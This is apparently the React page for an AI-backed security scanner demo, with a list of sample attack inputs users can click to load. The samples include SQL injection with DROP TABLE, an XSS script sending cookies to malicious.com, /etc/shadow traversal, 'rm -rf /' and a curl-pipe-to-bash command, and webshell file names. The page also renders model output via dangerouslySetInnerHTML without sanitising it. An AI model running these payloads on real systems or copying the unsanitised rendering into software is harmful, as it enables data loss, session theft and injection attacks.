import { useState, useEffect } from 'react';

export default function Home() {
  const [data, setData] = useState('');
  const [result, setResult] = useState('');
  const [thinking, setThinking] = useState(false);
  const [thinked, setThinked] = useState(false);
  const [thinkingMessage, setThinkingMessage] = useState('');
  const [displayMessage, setDisplayMessage] = useState('');
  const [darkMode, setDarkMode] = useState(false);

  const demoData = [
    {
      title: "SQL Injection Example",
      content: "SELECT * FROM users WHERE username = '$input' AND password = '$pass'; DROP TABLE users; SELECT * FROM sensitive_data WHERE user_id = '1' OR '1'='1'; UPDATE users SET admin='true' WHERE username='$input'"
    },
    {
      title: "XSS Attack Pattern",
      content: "<script>document.cookie='session='+document.cookie; new Image().src='http://malicious.com/steal?cookie='+document.cookie;</script><img src=x onerror='alert(document.cookie)'><iframe src='javascript:alert(`xss`)'></iframe>"
    },
    {
      title: "Directory Traversal",
      content: "../../../etc/passwd\n../../../etc/shadow\n../../../var/www/html/config.php\n../../../usr/local/etc/apache2/httpd.conf\n../../../../Windows/system.ini\n..\\..\\..\\Windows\\win.ini"
    },
    {
      title: "Command Injection",
      content: "ping 192.168.1.1; rm -rf /; cat /etc/passwd; echo 'malicious' > system.txt; $(curl http://malicious.com/script.sh | bash)"
    },
    {
      title: "File Upload Exploit",
      content: "malware.php.jpg\nshell.aspx.jpeg\nexploit.jsp.png\nbackdoor.php%00.jpg\nwebshell.php%20\nmalicious.php;.jpg"
    },
    {
      title: "CSRF Attack",
      content: "<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='to' value='attacker'></form><script>document.forms[0].submit()</script>"
    }
  ];

  useEffect(() => {
    if (thinking && thinkingMessage) {
      let index = 0;
      const timer = setInterval(() => {
        if (index <= thinkingMessage.length && !thinkingMessage.includes('</think>')) {
          setDisplayMessage(thinkingMessage.slice(0, index));
          index++;
        } else if (thinkingMessage.includes('</think>')) {
          setDisplayMessage(thinkingMessage.split('</think>')[0]);
          clearInterval(timer);
        } else {
          clearInterval(timer);
        }
      }, 30);
      return () => clearInterval(timer);
    }
  }, [thinking, thinkingMessage]);
  const handleSubmit = async (e) => {
    e.preventDefault();
    setThinking(true);
    setThinkingMessage('Analyzing data...');
    setDisplayMessage('');

    try {
      const response = await fetch('/api/detect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data }),
      });

      if (!response.ok) {
        throw new Error('Failed to fetch data');
      }

      const { result } = await response.json();

      const thinkMessage = extractThinkMessage(result);
      const thingingResult = result.split('</think>')[0]?.trim() || '';
      const restOfResult = result.split('</think>')[1]?.trim() || '';
      setThinkingMessage(cleanText(thingingResult));

      setTimeout(() => {
        setResult(cleanText(restOfResult));
        setThinking(false);
      }, thinkingMessage.length * 20);

    } catch (error) {
      setThinkingMessage('An error occurred. Please try again.');
    }
  };

  const extractThinkMessage = (text) => {
    const match = text.match(/<think>(.*?)<\/think>/);
    return match ? match[1] : 'Thinking...';
  };

  const cleanText = (text) => {
    let cleanedText = text
      .replace(/\*\*(.*?)\*\*/g, '<strong className="text-red-600">$1</strong>')
      .replace(/\*(.*?)\*/g, '<em>$1</em>')
      .replace(/##(.*?)##/g, '<h2>$1</h2>')
      .replace(/\[(.*?)\]/g, '<span>$1</span>')
      .replace(/#{1,6}\s?(.*?)$/gm, '<h3>$1</h3>')
      .replace(/\n{3,}/g, '<br/><br/>')
      .replace(/---/g, '<hr/>')
      .replace(/- (.*)/g, '<li>$1</li>')
      .trim();

    return cleanedText;
  };

  return (
    <div className={`min-h-screen relative overflow-hidden ${darkMode ? 'bg-black bg-opacity-95 bg-matrix-pattern' : 'bg-white'}`}>
      <style jsx global>{`
        ::-webkit-scrollbar {
          width: 8px;
          height: 8px;
        }
        ::-webkit-scrollbar-track {
          background: ${darkMode ? 'rgba(0, 0, 0, 0.4)' : 'rgba(229, 231, 235, 0.4)'};
          border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
          background: ${darkMode ? 'linear-gradient(to bottom, #10B981, #059669)' : 'linear-gradient(to bottom, #059669, #047857)'};
          border-radius: 10px;
          border: 2px solid ${darkMode ? 'rgba(16, 185, 129, 0.1)' : 'rgba(16, 185, 129, 0.2)'};
        }
        ::-webkit-scrollbar-thumb:hover {
          background: ${darkMode ? 'linear-gradient(to bottom, #059669, #047857)' : 'linear-gradient(to bottom, #047857, #065F46)'};
        }
      `}</style>
      <button
        onClick={() => setDarkMode(!darkMode)}
        className={`absolute top-4 right-4 p-2 rounded-full ${
          darkMode ? 'bg-white text-black' : 'bg-black text-white'
        } transition-all duration-300`}
      >
        {darkMode ? (
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
          </svg>
        ) : (
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
          </svg>
        )}
      </button>
      <div className={`absolute inset-0 ${darkMode ? 'bg-gradient-to-b from-green-500/10 to-transparent' : 'bg-gradient-to-b from-emerald-500/5 to-transparent'} pointer-events-none`}></div>
      <div className="relative max-w-7xl mx-auto p-4 sm:p-6 lg:p-8">
        <h1 className={`text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r ${darkMode ? 'from-green-400 via-green-500 to-emerald-600' : 'from-emerald-600 via-green-500 to-green-400'} mb-6 sm:mb-8 lg:mb-12 text-center tracking-tight`}>
          AI CyberSentry Scanner
        </h1>
        <div className="grid grid-cols-1 md:grid-cols-12 gap-4 sm:gap-6 lg:gap-8">
          {/* Demo Data Section */}
          <div className="md:col-span-12 lg:col-span-3">
            <div className={`backdrop-blur-xl ${darkMode ? 'bg-black/40' : 'bg-white/40'} rounded-[2rem] shadow-2xl ${darkMode ? 'shadow-green-500/20' : 'shadow-emerald-500/20'} p-4 sm:p-6 border ${darkMode ? 'border-green-500/30' : 'border-emerald-500/30'}`}>
              <h2 className={`text-lg sm:text-xl font-bold ${darkMode ? 'text-green-400' : 'text-emerald-600'} mb-4`}>Demo Examples</h2>
              <div className="space-y-4 max-h-[300px] sm:max-h-[400px] lg:max-h-[500px] overflow-y-auto">
                {demoData.map((demo, index) => (
                  <div 
                    key={index}
                    className={`p-3 sm:p-4 ${darkMode ? 'bg-black/60' : 'bg-white/60'} rounded-xl border ${darkMode ? 'border-green-500/20 hover:border-green-500/40' : 'border-emerald-500/20 hover:border-emerald-500/40'} transition-all cursor-pointer`}
                    onClick={() => setData(demo.content)}
                  >
                    <h3 className={`${darkMode ? 'text-green-400' : 'text-emerald-600'} font-medium mb-2`}>{demo.title}</h3>
                    <pre className={`${darkMode ? 'text-green-300/70' : 'text-emerald-600/70'} text-xs font-mono truncate`}>
                      {demo.content}
                    </pre>
                  </div>
                ))}
              </div>
            </div>
          </div>
          {/* Main Content Section */}
          <div className="md:col-span-12 lg:col-span-9">
            <div className={`relative backdrop-blur-xl ${darkMode ? 'bg-black/40' : 'bg-white/40'} rounded-[2rem] shadow-2xl ${darkMode ? 'shadow-green-500/20' : 'shadow-emerald-500/20'} p-4 sm:p-6 lg:p-10 border ${darkMode ? 'border-green-500/30' : 'border-emerald-500/30'}`}>
              <div className={`absolute top-0 left-0 w-full h-1 bg-gradient-to-r ${darkMode ? 'from-green-500 to-emerald-500' : 'from-emerald-500 to-green-500'} rounded-t-[2rem]`}></div>
              <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
                <div className="relative group">
                  <textarea
                    className={`w-full h-40 sm:h-56 p-4 sm:p-6 ${darkMode ? 'bg-black/80 text-green-400' : 'bg-white/80 text-emerald-600'} rounded-xl border-2 ${darkMode ? 'border-green-500/30 focus:border-green-400 focus:ring-green-400/20' : 'border-emerald-500/30 focus:border-emerald-400 focus:ring-emerald-400/20'} transition-all duration-300 resize-none font-mono text-sm ${darkMode ? 'placeholder-green-700' : 'placeholder-emerald-700'}`}
                    value={data}
                    onChange={(e) => setData(e.target.value)}
                    placeholder="// Input data for security analysis..."
                  />
                  <div className={`absolute top-4 right-4 px-3 py-1.5 rounded-lg ${darkMode ? 'bg-green-900/40 border-green-500/40' : 'bg-emerald-900/40 border-emerald-500/40'} backdrop-blur-sm`}>
                    <span className={`text-xs ${darkMode ? 'text-green-400' : 'text-emerald-400'} font-mono tracking-wider`}>SECURE_INPUT</span>
                  </div>
                </div>
                <button
                  className={`w-full py-4 sm:py-5 px-6 sm:px-8 bg-gradient-to-r ${darkMode ? 'from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700' : 'from-emerald-500 to-green-600 hover:from-emerald-600 hover:to-green-700'} text-white font-bold rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] focus:ring-4 ${darkMode ? 'focus:ring-green-500/30' : 'focus:ring-emerald-500/30'} group relative overflow-hidden`}
                  type="submit"
                >
                  <span className="relative z-10 flex items-center justify-center gap-2 sm:gap-3 text-base sm:text-lg">
                    <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                    Initialize Scan
                  </span>
                </button>
              </form>
              {thinking ? (
                <div className={`mt-6 sm:mt-8 lg:mt-10 p-4 sm:p-6 lg:p-8 ${darkMode ? 'bg-black/90' : 'bg-white/90'} rounded-xl border ${darkMode ? 'border-green-500/40' : 'border-emerald-500/40'} backdrop-blur-lg`}>
                  <h2 className={`text-xl sm:text-2xl font-bold ${darkMode ? 'text-green-400' : 'text-emerald-600'} mb-4 sm:mb-6 flex items-center gap-2 sm:gap-3`}>
                    <svg className="w-5 h-5 sm:w-6 sm:h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                    </svg>
                    System Analysis in Progress
                  </h2>
                  <div className="max-h-[300px] sm:max-h-[400px] lg:max-h-[500px] overflow-y-auto">
                      <div className={`${darkMode ? 'text-green-300' : 'text-emerald-600'} font-mono text-sm leading-relaxed whitespace-pre-wrap break-words ${darkMode ? 'bg-black/50' : 'bg-white/50'} p-4 sm:p-6 rounded-xl border ${darkMode ? 'border-green-500/30' : 'border-emerald-500/30'}`} dangerouslySetInnerHTML={{ __html: displayMessage }} />
                    </div>
                </div>
              ) : (
                result && (
                  <div className={`mt-6 sm:mt-8 lg:mt-10 p-4 sm:p-6 lg:p-8 ${darkMode ? 'bg-black/90' : 'bg-white/90'} rounded-xl border ${darkMode ? 'border-green-500/40' : 'border-emerald-500/40'} backdrop-blur-lg`}>
                    <h2 className={`text-xl sm:text-2xl font-bold ${darkMode ? 'text-green-400' : 'text-emerald-600'} mb-4 sm:mb-6 flex items-center gap-2 sm:gap-3`}>
                      <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                      </svg>
                      Threat Analysis Report
                    </h2>
                    <div className="max-h-[300px] sm:max-h-[400px] lg:max-h-[500px] overflow-y-auto">
                      <div className={`${darkMode ? 'text-green-300' : 'text-emerald-600'} font-mono text-sm leading-relaxed whitespace-pre-wrap break-words ${darkMode ? 'bg-black/50' : 'bg-white/50'} p-4 sm:p-6 rounded-xl border ${darkMode ? 'border-green-500/30' : 'border-emerald-500/30'}`} dangerouslySetInnerHTML={{ __html: result }} />
                    </div>
                  </div>
                )
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
